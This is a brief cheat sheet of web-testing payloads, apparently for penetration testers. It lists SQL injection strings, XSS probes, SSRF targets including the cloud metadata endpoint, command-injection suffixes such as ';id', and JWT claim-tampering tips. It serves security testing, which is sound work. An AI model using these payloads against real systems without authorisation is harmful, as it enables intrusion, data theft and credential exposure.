# Payload Libraries

## SQL Injection
- `' OR '1'='1`
- `' UNION SELECT NULL--`
- `'; WAITFOR DELAY '0:0:5'--`

## XSS
- `<svg/onload=alert(1)>`
- `"><script>alert(1)</script>`
- `<img src=x onerror=alert(document.domain)>`

## SSRF
- `http://127.0.0.1:8080`
- `http://169.254.169.254/latest/meta-data/`
- `http://localhost/admin`

## Command Injection
- `;id`
- `&& whoami`
- `| ping -n 5 127.0.0.1`

## JWT
- Modify role claims and test weak HMAC secrets.
- Validate `alg`, `kid`, `aud`, `iss`, and `exp` handling.